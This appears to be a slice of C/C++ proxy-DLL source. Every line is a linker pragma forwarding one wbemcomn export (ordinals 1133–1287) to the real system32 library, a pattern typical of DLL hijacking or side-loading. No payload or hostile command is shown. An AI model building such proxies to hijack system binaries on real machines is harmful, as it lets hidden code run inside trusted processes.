#pragma comment (linker, "/export:?SetRegistryPathCIMOM@CWbemInstallObject@@SAXPEBG@Z=c:/windows/system32/wbemcomn.?SetRegistryPathCIMOM@CWbemInstallObject@@SAXPEBG@Z,@1133")
#pragma comment (linker, "/export:?SetRegistryPathWbem@CWbemInstallObject@@SAXPEBG@Z=c:/windows/system32/wbemcomn.?SetRegistryPathWbem@CWbemInstallObject@@SAXPEBG@Z,@1134")
#pragma comment (linker, "/export:?SetRepositoryFolder@CWbemInstallObject@@SAXPEBG@Z=c:/windows/system32/wbemcomn.?SetRepositoryFolder@CWbemInstallObject@@SAXPEBG@Z,@1135")
#pragma comment (linker, "/export:?SetRequestLimits@CExecQueue@@QEAAXJJJ@Z=c:/windows/system32/wbemcomn.?SetRequestLimits@CExecQueue@@QEAAXJJJ@Z,@1136")
#pragma comment (linker, "/export:?SetSacl@CNtSecurityDescriptor@@QEAAHPEAVCNtAcl@@@Z=c:/windows/system32/wbemcomn.?SetSacl@CNtSecurityDescriptor@@QEAAHPEAVCNtAcl@@@Z,@1137")
#pragma comment (linker, "/export:?SetSafeArray@CVar@@QEAAXHPEAUtagSAFEARRAY@@@Z=c:/windows/system32/wbemcomn.?SetSafeArray@CVar@@QEAAXHPEAUtagSAFEARRAY@@@Z,@1138")
#pragma comment (linker, "/export:?SetScalarAt@CSafeArray@@AEAAHHTSA_ArrayScalar@@@Z=c:/windows/system32/wbemcomn.?SetScalarAt@CSafeArray@@AEAAHHTSA_ArrayScalar@@@Z,@1139")
#pragma comment (linker, "/export:?SetShort@CVar@@QEAAXF@Z=c:/windows/system32/wbemcomn.?SetShort@CVar@@QEAAXF@Z,@1140")
#pragma comment (linker, "/export:?SetShortAt@CSafeArray@@QEAAHHF@Z=c:/windows/system32/wbemcomn.?SetShortAt@CSafeArray@@QEAAHHF@Z,@1141")
#pragma comment (linker, "/export:?SetSize@CBuffer@@QEAAJK@Z=c:/windows/system32/wbemcomn.?SetSize@CBuffer@@QEAAJK@Z,@1142")
#pragma comment (linker, "/export:?SetSize@CBuffer@@UEAAJT_ULARGE_INTEGER@@@Z=c:/windows/system32/wbemcomn.?SetSize@CBuffer@@UEAAJT_ULARGE_INTEGER@@@Z,@1143")
#pragma comment (linker, "/export:?SetSize@CFlexArray@@QEAAXH@Z=c:/windows/system32/wbemcomn.?SetSize@CFlexArray@@QEAAXH@Z,@1144")
#pragma comment (linker, "/export:?SetSleepAtMax@CMinMaxLimitControl@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetSleepAtMax@CMinMaxLimitControl@@QEAAXK@Z,@1145")
#pragma comment (linker, "/export:?SetStr@Registry@@QEAAHPEBG0@Z=c:/windows/system32/wbemcomn.?SetStr@Registry@@QEAAHPEBG0@Z,@1146")
#pragma comment (linker, "/export:?SetSystemTime@CWbemTime@@QEAAHAEBU_SYSTEMTIME@@@Z=c:/windows/system32/wbemcomn.?SetSystemTime@CWbemTime@@QEAAHAEBU_SYSTEMTIME@@@Z,@1147")
#pragma comment (linker, "/export:?SetTemplate@CTextTemplate@@QEAAXPEBG@Z=c:/windows/system32/wbemcomn.?SetTemplate@CTextTemplate@@QEAAXPEBG@Z,@1148")
#pragma comment (linker, "/export:?SetThreadLimits@CExecQueue@@QEAAXJJJ@Z=c:/windows/system32/wbemcomn.?SetThreadLimits@CExecQueue@@QEAAXJJJ@Z,@1149")
#pragma comment (linker, "/export:?SetTolerance@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Tolerance@@@Z=c:/windows/system32/wbemcomn.?SetTolerance@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Tolerance@@@Z,@1150")
#pragma comment (linker, "/export:?SetTraceLevel@CWMITraceSettings@@QEAAXE@Z=c:/windows/system32/wbemcomn.?SetTraceLevel@CWMITraceSettings@@QEAAXE@Z,@1151")
#pragma comment (linker, "/export:?SetUnknown@CVar@@QEAAXPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?SetUnknown@CVar@@QEAAXPEAUIUnknown@@@Z,@1152")
#pragma comment (linker, "/export:?SetUnknownAt@CSafeArray@@QEAAHHPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?SetUnknownAt@CSafeArray@@QEAAHHPEAUIUnknown@@@Z,@1153")
#pragma comment (linker, "/export:?SetVarVector@CVar@@QEAAXPEAVCVarVector@@H@Z=c:/windows/system32/wbemcomn.?SetVarVector@CVar@@QEAAXPEAVCVarVector@@H@Z,@1154")
#pragma comment (linker, "/export:?SetVariant@CVar@@QEAAHPEAUtagVARIANT@@H@Z=c:/windows/system32/wbemcomn.?SetVariant@CVar@@QEAAHPEAUtagVARIANT@@H@Z,@1155")
#pragma comment (linker, "/export:?SetVariantAt@CSafeArray@@QEAAHHPEAUtagVARIANT@@@Z=c:/windows/system32/wbemcomn.?SetVariantAt@CSafeArray@@QEAAHHPEAUtagVARIANT@@@Z,@1156")
#pragma comment (linker, "/export:?SetWMITraceSession@@YAXPEAX@Z=c:/windows/system32/wbemcomn.?SetWMITraceSession@@YAXPEAX@Z,@1157")
#pragma comment (linker, "/export:?SetWhenDoneHandle@CExecRequest@@QEAAXPEAX@Z=c:/windows/system32/wbemcomn.?SetWhenDoneHandle@CExecRequest@@QEAAXPEAX@Z,@1158")
#pragma comment (linker, "/export:?SetWord@CVar@@QEAAXG@Z=c:/windows/system32/wbemcomn.?SetWord@CVar@@QEAAXG@Z,@1159")
#pragma comment (linker, "/export:?Set_WPP_INIT_TRACING_Call_State@@YAX_N@Z=c:/windows/system32/wbemcomn.?Set_WPP_INIT_TRACING_Call_State@@YAX_N@Z,@1160")
#pragma comment (linker, "/export:?Shrink@CSmallArrayBlob@@IEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?Shrink@CSmallArrayBlob@@IEAAPEAV1@XZ,@1161")
#pragma comment (linker, "/export:?ShrinkIfNeeded@CSmallArrayBlob@@IEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?ShrinkIfNeeded@CSmallArrayBlob@@IEAAPEAV1@XZ,@1162")
#pragma comment (linker, "/export:?Shutdown@CExecQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?Shutdown@CExecQueue@@QEAAXXZ,@1163")
#pragma comment (linker, "/export:?Shutdown@CTimerGenerator@@UEAAJXZ=c:/windows/system32/wbemcomn.?Shutdown@CTimerGenerator@@UEAAJXZ,@1164")
#pragma comment (linker, "/export:?Shutdown@CWbemInstallObject@@SAXXZ=c:/windows/system32/wbemcomn.?Shutdown@CWbemInstallObject@@SAXXZ,@1165")
#pragma comment (linker, "/export:?ShutdownThread@CExecQueue@@MEAAXPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?ShutdownThread@CExecQueue@@MEAAXPEAVCThreadRecord@1@@Z,@1166")
#pragma comment (linker, "/export:?SitOutPenalty@CExecQueue@@MEAAXJ@Z=c:/windows/system32/wbemcomn.?SitOutPenalty@CExecQueue@@MEAAXJ@Z,@1167")
#pragma comment (linker, "/export:?Size@CFlexArray@@QEBAHXZ=c:/windows/system32/wbemcomn.?Size@CFlexArray@@QEBAHXZ,@1168")
#pragma comment (linker, "/export:?Size@CSafeArray@@QEAAHXZ=c:/windows/system32/wbemcomn.?Size@CSafeArray@@QEAAHXZ,@1169")
#pragma comment (linker, "/export:?Size@CSmallArrayBlob@@QEBAHXZ=c:/windows/system32/wbemcomn.?Size@CSmallArrayBlob@@QEBAHXZ,@1170")
#pragma comment (linker, "/export:?Size@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?Size@CVarVector@@QEAAHXZ,@1171")
#pragma comment (linker, "/export:?Size@CWStringArray@@QEBAHXZ=c:/windows/system32/wbemcomn.?Size@CWStringArray@@QEBAHXZ,@1172")
#pragma comment (linker, "/export:?Sort@CFlexArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Sort@CFlexArray@@QEAAXXZ,@1173")
#pragma comment (linker, "/export:?Sort@CSmallArrayBlob@@QEAAXXZ=c:/windows/system32/wbemcomn.?Sort@CSmallArrayBlob@@QEAAXXZ,@1174")
#pragma comment (linker, "/export:?Sort@CWStringArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Sort@CWStringArray@@QEAAXXZ,@1175")
#pragma comment (linker, "/export:?Start@CTraceSessionControl@@SAKPEBU_GUID@@PEAVCWMITraceSettings@@@Z=c:/windows/system32/wbemcomn.?Start@CTraceSessionControl@@SAKPEBU_GUID@@PEAVCWMITraceSettings@@@Z,@1176")
#pragma comment (linker, "/export:?Stat@CBuffer@@UEAAJPEAUtagSTATSTG@@K@Z=c:/windows/system32/wbemcomn.?Stat@CBuffer@@UEAAJPEAUtagSTATSTG@@K@Z,@1177")
#pragma comment (linker, "/export:?Status@CSafeArray@@QEAAHXZ=c:/windows/system32/wbemcomn.?Status@CSafeArray@@QEAAHXZ,@1178")
#pragma comment (linker, "/export:?Status@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?Status@CVar@@QEAAHXZ,@1179")
#pragma comment (linker, "/export:?Status@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?Status@CVarVector@@QEAAHXZ,@1180")
#pragma comment (linker, "/export:?StripToToken@WString2@@QEAAAEAV1@GH@Z=c:/windows/system32/wbemcomn.?StripToToken@WString2@@QEAAAEAV1@GH@Z,@1181")
#pragma comment (linker, "/export:?StripToToken@WString@@QEAAAEAV1@GH@Z=c:/windows/system32/wbemcomn.?StripToToken@WString@@QEAAAEAV1@GH@Z,@1182")
#pragma comment (linker, "/export:?StripWhereClause@CWQLScanner@@AEAAHXZ=c:/windows/system32/wbemcomn.?StripWhereClause@CWQLScanner@@AEAAHXZ,@1183")
#pragma comment (linker, "/export:?StripWs@WString2@@QEAAAEAV1@H@Z=c:/windows/system32/wbemcomn.?StripWs@WString2@@QEAAAEAV1@H@Z,@1184")
#pragma comment (linker, "/export:?StripWs@WString@@QEAAAEAV1@H@Z=c:/windows/system32/wbemcomn.?StripWs@WString@@QEAAAEAV1@H@Z,@1185")
#pragma comment (linker, "/export:?SwitchRow@CLike@@AEAAX_KAEAPEAE1@Z=c:/windows/system32/wbemcomn.?SwitchRow@CLike@@AEAAX_KAEAPEAE1@Z,@1186")
#pragma comment (linker, "/export:?Terminate@CBasicUnloadInstruction@@QEAAXXZ=c:/windows/system32/wbemcomn.?Terminate@CBasicUnloadInstruction@@QEAAXXZ,@1187")
#pragma comment (linker, "/export:?TestDirExistAndCreateWithSDIfNotThere@@YAJPEAG0@Z=c:/windows/system32/wbemcomn.?TestDirExistAndCreateWithSDIfNotThere@@YAJPEAG0@Z,@1188")
#pragma comment (linker, "/export:?ThreadMain@CExecQueue@@MEAAXPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?ThreadMain@CExecQueue@@MEAAXPEAVCThreadRecord@1@@Z,@1189")
#pragma comment (linker, "/export:?Throttle@@YAJKKKKK@Z=c:/windows/system32/wbemcomn.?Throttle@@YAJKKKKK@Z,@1190")
#pragma comment (linker, "/export:?TimeFormat1@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat1@CDateTimeParser@@IEAAHPEBGH@Z,@1191")
#pragma comment (linker, "/export:?TimeFormat2@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat2@CDateTimeParser@@IEAAHPEBGH@Z,@1192")
#pragma comment (linker, "/export:?TimeFormat3@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat3@CDateTimeParser@@IEAAHPEBGH@Z,@1193")
#pragma comment (linker, "/export:?TimeFormat4@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat4@CDateTimeParser@@IEAAHPEBGH@Z,@1194")
#pragma comment (linker, "/export:?TimeFormat5@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat5@CDateTimeParser@@IEAAHPEBGH@Z,@1195")
#pragma comment (linker, "/export:?TimeFormat6@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat6@CDateTimeParser@@IEAAHPEBGH@Z,@1196")
#pragma comment (linker, "/export:?TimeFormat7@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat7@CDateTimeParser@@IEAAHPEBGH@Z,@1197")
#pragma comment (linker, "/export:?TimeFormat8@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat8@CDateTimeParser@@IEAAHPEBGH@Z,@1198")
#pragma comment (linker, "/export:?TimeFormat9@CDateTimeParser@@IEAAHPEBGH@Z=c:/windows/system32/wbemcomn.?TimeFormat9@CDateTimeParser@@IEAAHPEBGH@Z,@1199")
#pragma comment (linker, "/export:?TimeToWait@CInstructionQueue@@IEAA?AVCWbemInterval@@XZ=c:/windows/system32/wbemcomn.?TimeToWait@CInstructionQueue@@IEAA?AVCWbemInterval@@XZ,@1200")
#pragma comment (linker, "/export:?ToSingleChar@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?ToSingleChar@CVar@@QEAAHXZ,@1201")
#pragma comment (linker, "/export:?ToSingleChar@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?ToSingleChar@CVarVector@@QEAAHXZ,@1202")
#pragma comment (linker, "/export:?ToUI4@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?ToUI4@CVar@@QEAAHXZ,@1203")
#pragma comment (linker, "/export:?ToUI4@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?ToUI4@CVarVector@@QEAAHXZ,@1204")
#pragma comment (linker, "/export:?TouchHead@CInstructionQueue@@IEAAXXZ=c:/windows/system32/wbemcomn.?TouchHead@CInstructionQueue@@IEAAXXZ,@1205")
#pragma comment (linker, "/export:?Transform@MD5@@SAXPEAXIQEAE@Z=c:/windows/system32/wbemcomn.?Transform@MD5@@SAXPEAXIQEAE@Z,@1206")
#pragma comment (linker, "/export:?Transform@SHA256@@SAXPEAXIQEAE@Z=c:/windows/system32/wbemcomn.?Transform@SHA256@@SAXPEAXIQEAE@Z,@1207")
#pragma comment (linker, "/export:?TranslateIntrinsic@CAbstractQl1Parser@@KAKPEBG@Z=c:/windows/system32/wbemcomn.?TranslateIntrinsic@CAbstractQl1Parser@@KAKPEBG@Z,@1208")
#pragma comment (linker, "/export:?Trim@CFlexArray@@QEAAXXZ=c:/windows/system32/wbemcomn.?Trim@CFlexArray@@QEAAXXZ,@1209")
#pragma comment (linker, "/export:?Trim@CSafeArray@@QEAAHXZ=c:/windows/system32/wbemcomn.?Trim@CSafeArray@@QEAAHXZ,@1210")
#pragma comment (linker, "/export:?Trim@CSmallArrayBlob@@QEAAXXZ=c:/windows/system32/wbemcomn.?Trim@CSmallArrayBlob@@QEAAXXZ,@1211")
#pragma comment (linker, "/export:?TruncAtLToken@WString2@@QEAAAEAV1@G@Z=c:/windows/system32/wbemcomn.?TruncAtLToken@WString2@@QEAAAEAV1@G@Z,@1212")
#pragma comment (linker, "/export:?TruncAtLToken@WString@@QEAAAEAV1@G@Z=c:/windows/system32/wbemcomn.?TruncAtLToken@WString@@QEAAAEAV1@G@Z,@1213")
#pragma comment (linker, "/export:?TruncAtRToken@WString2@@QEAAAEAV1@G@Z=c:/windows/system32/wbemcomn.?TruncAtRToken@WString2@@QEAAAEAV1@G@Z,@1214")
#pragma comment (linker, "/export:?TruncAtRToken@WString@@QEAAAEAV1@G@Z=c:/windows/system32/wbemcomn.?TruncAtRToken@WString@@QEAAAEAV1@G@Z,@1215")
#pragma comment (linker, "/export:?TypeToText@CVar@@SAPEAGH@Z=c:/windows/system32/wbemcomn.?TypeToText@CVar@@SAPEAGH@Z,@1216")
#pragma comment (linker, "/export:?UnRegisterDLL@@YAXU_GUID@@PEAG@Z=c:/windows/system32/wbemcomn.?UnRegisterDLL@@YAXU_GUID@@PEAG@Z,@1217")
#pragma comment (linker, "/export:?Unaccess@CSafeArray@@QEAAJXZ=c:/windows/system32/wbemcomn.?Unaccess@CSafeArray@@QEAAJXZ,@1218")
#pragma comment (linker, "/export:?UnaccessRawArray@CVarVector@@QEAAJXZ=c:/windows/system32/wbemcomn.?UnaccessRawArray@CVarVector@@QEAAJXZ,@1219")
#pragma comment (linker, "/export:?UnbindPtr@CFlexArray@@QEAAPEAPEAXXZ=c:/windows/system32/wbemcomn.?UnbindPtr@CFlexArray@@QEAAPEAPEAXXZ,@1220")
#pragma comment (linker, "/export:?UnbindPtr@WString2@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?UnbindPtr@WString2@@QEAAPEAGXZ,@1221")
#pragma comment (linker, "/export:?UnbindPtr@WString@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?UnbindPtr@WString@@QEAAPEAGXZ,@1222")
#pragma comment (linker, "/export:?UnblockedWaitForSingleObject@CExecQueue@@MEAAKPEAXKPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?UnblockedWaitForSingleObject@CExecQueue@@MEAAKPEAXKPEAVCThreadRecord@1@@Z,@1223")
#pragma comment (linker, "/export:?UncompressBuffer@CMRCICompression@@QEAAIPEAEK0KW4CompressionLevel@1@@Z=c:/windows/system32/wbemcomn.?UncompressBuffer@CMRCICompression@@QEAAIPEAEK0KW4CompressionLevel@1@@Z,@1224")
#pragma comment (linker, "/export:?UncompressFile@CMRCICompression@@QEAAHPEBG0@Z=c:/windows/system32/wbemcomn.?UncompressFile@CMRCICompression@@QEAAHPEBG0@Z,@1225")
#pragma comment (linker, "/export:?UncompressFileV1@CMRCICompression@@IEAAHHH@Z=c:/windows/system32/wbemcomn.?UncompressFileV1@CMRCICompression@@IEAAHHH@Z,@1226")
#pragma comment (linker, "/export:?UninitializeThread@CExecQueue@@MEAAXXZ=c:/windows/system32/wbemcomn.?UninitializeThread@CExecQueue@@MEAAXXZ,@1227")
#pragma comment (linker, "/export:?Union@CWStringArray@@SAXAEAV1@00@Z=c:/windows/system32/wbemcomn.?Union@CWStringArray@@SAXAEAV1@00@Z,@1228")
#pragma comment (linker, "/export:?Unlock@?$CLockableFlexArray@VCStaticCritSec@@@@QEAAXXZ=c:/windows/system32/wbemcomn.?Unlock@?$CLockableFlexArray@VCStaticCritSec@@@@QEAAXXZ,@1229")
#pragma comment (linker, "/export:?Unlock@CClientOpsNode@@QEAAXXZ=c:/windows/system32/wbemcomn.?Unlock@CClientOpsNode@@QEAAXXZ,@1230")
#pragma comment (linker, "/export:?UnlockRegion@CBuffer@@UEAAJT_ULARGE_INTEGER@@0K@Z=c:/windows/system32/wbemcomn.?UnlockRegion@CBuffer@@UEAAJT_ULARGE_INTEGER@@0K@Z,@1231")
#pragma comment (linker, "/export:?Unqueue@CFlexQueue@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?Unqueue@CFlexQueue@@QEAAPEAXXZ,@1232")
#pragma comment (linker, "/export:?Unquote@WString2@@QEAAXXZ=c:/windows/system32/wbemcomn.?Unquote@WString2@@QEAAXXZ,@1233")
#pragma comment (linker, "/export:?Unquote@WString@@QEAAXXZ=c:/windows/system32/wbemcomn.?Unquote@WString@@QEAAXXZ,@1234")
#pragma comment (linker, "/export:?UnregisterCMIFlushRepositoryCacheHook@CWbemInstallObject@@SAXXZ=c:/windows/system32/wbemcomn.?UnregisterCMIFlushRepositoryCacheHook@CWbemInstallObject@@SAXXZ,@1235")
#pragma comment (linker, "/export:?UnregisterDllAppid@@YAJU_GUID@@@Z=c:/windows/system32/wbemcomn.?UnregisterDllAppid@@YAJU_GUID@@@Z,@1236")
#pragma comment (linker, "/export:?UpdateChildren@CClientOpsNode@@AEAAXPEAV1@@Z=c:/windows/system32/wbemcomn.?UpdateChildren@CClientOpsNode@@AEAAXPEAV1@@Z,@1237")
#pragma comment (linker, "/export:?ValidateMemSize@CWin32DefaultArena@@SAHH@Z=c:/windows/system32/wbemcomn.?ValidateMemSize@CWin32DefaultArena@@SAHH@Z,@1238")
#pragma comment (linker, "/export:?WMIControlCallback@@YAK_KPEAEPEAK@Z=c:/windows/system32/wbemcomn.?WMIControlCallback@@YAK_KPEAEPEAK@Z,@1239")
#pragma comment (linker, "/export:?WMIControlClientOpsCallback@@YAK_KPEAEPEAK@Z=c:/windows/system32/wbemcomn.?WMIControlClientOpsCallback@@YAK_KPEAEPEAK@Z,@1240")
#pragma comment (linker, "/export:?WaitAndPeek@CInstructionQueue@@QEAAJAEAPEAVCTimerInstruction@@AEAVCWbemTime@@@Z=c:/windows/system32/wbemcomn.?WaitAndPeek@CInstructionQueue@@QEAAJAEAPEAVCTimerInstruction@@AEAVCWbemTime@@@Z,@1241")
#pragma comment (linker, "/export:?WaitForResumption@CHaltable@@QEAAJXZ=c:/windows/system32/wbemcomn.?WaitForResumption@CHaltable@@QEAAJXZ,@1242")
#pragma comment (linker, "/export:?WaitForSingleObjectWhileBusy@CExecQueue@@MEAAKPEAXKPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?WaitForSingleObjectWhileBusy@CExecQueue@@MEAAKPEAXKPEAVCThreadRecord@1@@Z,@1243")
#pragma comment (linker, "/export:?WbemGetMachineShutdown@@YAHXZ=c:/windows/system32/wbemcomn.?WbemGetMachineShutdown@@YAHXZ,@1244")
#pragma comment (linker, "/export:?WbemHeapFree@CWin32DefaultArena@@SAXXZ=c:/windows/system32/wbemcomn.?WbemHeapFree@CWin32DefaultArena@@SAXXZ,@1245")
#pragma comment (linker, "/export:?WbemHeapInitialize@CWin32DefaultArena@@SAHPEAX@Z=c:/windows/system32/wbemcomn.?WbemHeapInitialize@CWin32DefaultArena@@SAHPEAX@Z,@1246")
#pragma comment (linker, "/export:?WbemMemAlloc@CWin32DefaultArena@@SAPEAX_K@Z=c:/windows/system32/wbemcomn.?WbemMemAlloc@CWin32DefaultArena@@SAPEAX_K@Z,@1247")
#pragma comment (linker, "/export:?WbemMemFree@CWin32DefaultArena@@SAHPEAX@Z=c:/windows/system32/wbemcomn.?WbemMemFree@CWin32DefaultArena@@SAHPEAX@Z,@1248")
#pragma comment (linker, "/export:?WbemMemReAlloc@CWin32DefaultArena@@SAPEAXPEAX_K@Z=c:/windows/system32/wbemcomn.?WbemMemReAlloc@CWin32DefaultArena@@SAPEAXPEAX_K@Z,@1249")
#pragma comment (linker, "/export:?WbemMemSize@CWin32DefaultArena@@SA_KPEAX@Z=c:/windows/system32/wbemcomn.?WbemMemSize@CWin32DefaultArena@@SA_KPEAX@Z,@1250")
#pragma comment (linker, "/export:?WbemOutOfMemory@CWin32DefaultArena@@SAHXZ=c:/windows/system32/wbemcomn.?WbemOutOfMemory@CWin32DefaultArena@@SAHXZ,@1251")
#pragma comment (linker, "/export:?WbemSetDynamicCloaking@@YAJPEAUIUnknown@@KK@Z=c:/windows/system32/wbemcomn.?WbemSetDynamicCloaking@@YAJPEAUIUnknown@@KK@Z,@1252")
#pragma comment (linker, "/export:?WbemSetMachineShutdown@@YAHH@Z=c:/windows/system32/wbemcomn.?WbemSetMachineShutdown@@YAHH@Z,@1253")
#pragma comment (linker, "/export:?WbemSysAllocString@CWin32DefaultArena@@SAPEAGPEBG@Z=c:/windows/system32/wbemcomn.?WbemSysAllocString@CWin32DefaultArena@@SAPEAGPEBG@Z,@1254")
#pragma comment (linker, "/export:?WbemSysAllocStringByteLen@CWin32DefaultArena@@SAPEAGPEBDI@Z=c:/windows/system32/wbemcomn.?WbemSysAllocStringByteLen@CWin32DefaultArena@@SAPEAGPEBDI@Z,@1255")
#pragma comment (linker, "/export:?WbemSysAllocStringLen@CWin32DefaultArena@@SAPEAGPEBGI@Z=c:/windows/system32/wbemcomn.?WbemSysAllocStringLen@CWin32DefaultArena@@SAPEAGPEBGI@Z,@1256")
#pragma comment (linker, "/export:?WbemSysFreeString@CWin32DefaultArena@@SAXPEAG@Z=c:/windows/system32/wbemcomn.?WbemSysFreeString@CWin32DefaultArena@@SAXPEAG@Z,@1257")
#pragma comment (linker, "/export:?WbemSysReAllocString@CWin32DefaultArena@@SAHPEAPEAGPEBG@Z=c:/windows/system32/wbemcomn.?WbemSysReAllocString@CWin32DefaultArena@@SAHPEAPEAGPEBG@Z,@1258")
#pragma comment (linker, "/export:?WbemSysReAllocStringLen@CWin32DefaultArena@@SAHPEAPEAGPEBGI@Z=c:/windows/system32/wbemcomn.?WbemSysReAllocStringLen@CWin32DefaultArena@@SAHPEAPEAGPEBGI@Z,@1259")
#pragma comment (linker, "/export:?WbemVariantChangeType@@YAJPEAUtagVARIANT@@0G@Z=c:/windows/system32/wbemcomn.?WbemVariantChangeType@@YAJPEAUtagVARIANT@@0G@Z,@1260")
#pragma comment (linker, "/export:?WildcardTest@WString@@QEBAHPEBG@Z=c:/windows/system32/wbemcomn.?WildcardTest@WString@@QEBAHPEBG@Z,@1261")
#pragma comment (linker, "/export:?WinPEKey@@YAHXZ=c:/windows/system32/wbemcomn.?WinPEKey@@YAHXZ,@1262")
#pragma comment (linker, "/export:?Write@CBuffer@@UEAAJPEBXKPEAK@Z=c:/windows/system32/wbemcomn.?Write@CBuffer@@UEAAJPEBXKPEAK@Z,@1263")
#pragma comment (linker, "/export:?Write@CMemoryLog@@QEAAXJ@Z=c:/windows/system32/wbemcomn.?Write@CMemoryLog@@QEAAXJ@Z,@1264")
#pragma comment (linker, "/export:?Write@CMemoryLog@@QEAAXPEAXK@Z=c:/windows/system32/wbemcomn.?Write@CMemoryLog@@QEAAXPEAXK@Z,@1265")
#pragma comment (linker, "/export:?WriteLPWSTR@CBuffer@@QEAAJPEBG@Z=c:/windows/system32/wbemcomn.?WriteLPWSTR@CBuffer@@QEAAJPEBG@Z,@1266")
#pragma comment (linker, "/export:?WriteToRegistry@CWMITraceSettings@@QEAAKPEBG@Z=c:/windows/system32/wbemcomn.?WriteToRegistry@CWMITraceSettings@@QEAAKPEBG@Z,@1267")
#pragma comment (linker, "/export:?_Alloc@CMUILocale@@SAPEAX_K@Z=c:/windows/system32/wbemcomn.?_Alloc@CMUILocale@@SAPEAX_K@Z,@1268")
#pragma comment (linker, "/export:?_DoTraceHRFailure_@@YAXJ@Z=c:/windows/system32/wbemcomn.?_DoTraceHRFailure_@@YAXJ@Z,@1269")
#pragma comment (linker, "/export:?_Free@CMUILocale@@SAHPEAX@Z=c:/windows/system32/wbemcomn.?_Free@CMUILocale@@SAHPEAX@Z,@1270")
#pragma comment (linker, "/export:?_GetSystemDefaultLocale@CMUILocale@@SAJPEAPEAGK@Z=c:/windows/system32/wbemcomn.?_GetSystemDefaultLocale@CMUILocale@@SAJPEAPEAGK@Z,@1271")
#pragma comment (linker, "/export:?_GetSystemDefaultLocaleName@CMUILocale@@SAJPEAPEAG@Z=c:/windows/system32/wbemcomn.?_GetSystemDefaultLocaleName@CMUILocale@@SAJPEAPEAG@Z,@1272")
#pragma comment (linker, "/export:?_GetThreadPreferredUILanguages@CMUILocale@@SAJKPEAKPEAG0@Z=c:/windows/system32/wbemcomn.?_GetThreadPreferredUILanguages@CMUILocale@@SAJKPEAKPEAG0@Z,@1273")
#pragma comment (linker, "/export:?_IsValidElementName@@YAHPEBGK0@Z=c:/windows/system32/wbemcomn.?_IsValidElementName@@YAHPEBGK0@Z,@1274")
#pragma comment (linker, "/export:?_LCIDToLocaleName@CMUILocale@@SAJKPEAGHK@Z=c:/windows/system32/wbemcomn.?_LCIDToLocaleName@CMUILocale@@SAJKPEAGHK@Z,@1275")
#pragma comment (linker, "/export:?_LocaleNameToLCID@CMUILocale@@SAJPEAGKPEAK@Z=c:/windows/system32/wbemcomn.?_LocaleNameToLCID@CMUILocale@@SAJPEAGKPEAK@Z,@1276")
#pragma comment (linker, "/export:?_SetThreadPreferredUILanguages@CMUILocale@@SAJKPEBGPEAK@Z=c:/windows/system32/wbemcomn.?_SetThreadPreferredUILanguages@CMUILocale@@SAJKPEBGPEAK@Z,@1277")
#pragma comment (linker, "/export:?_ThreadEntry@CExecQueue@@KAKPEAX@Z=c:/windows/system32/wbemcomn.?_ThreadEntry@CExecQueue@@KAKPEAX@Z,@1278")
#pragma comment (linker, "/export:?_ThrowMemoryException_@@YAXXZ=c:/windows/system32/wbemcomn.?_ThrowMemoryException_@@YAXXZ,@1279")
#pragma comment (linker, "/export:?aggregate_by@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?aggregate_by@CAbstractQl1Parser@@IEAAHXZ,@1280")
#pragma comment (linker, "/export:?aggregate_within@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?aggregate_within@CAbstractQl1Parser@@IEAAHXZ,@1281")
#pragma comment (linker, "/export:?aggregation_params@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?aggregation_params@CAbstractQl1Parser@@IEAAHXZ,@1282")
#pragma comment (linker, "/export:?anyFailed_@CStaticCritSec@@0HA=c:/windows/system32/wbemcomn.?anyFailed_@CStaticCritSec@@0HA,@1283")
#pragma comment (linker, "/export:?anyFailure@CStaticCritSec@@SAHXZ=c:/windows/system32/wbemcomn.?anyFailure@CStaticCritSec@@SAHXZ,@1284")
#pragma comment (linker, "/export:?bAreWeLocal@@YAHPEAG@Z=c:/windows/system32/wbemcomn.?bAreWeLocal@@YAHPEAG@Z,@1285")
#pragma comment (linker, "/export:?charbuf@CBaseMrciCompression@@AEAAXI@Z=c:/windows/system32/wbemcomn.?charbuf@CBaseMrciCompression@@AEAAXI@Z,@1286")
#pragma comment (linker, "/export:?class_name@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?class_name@CAbstractQl1Parser@@IEAAHXZ,@1287")
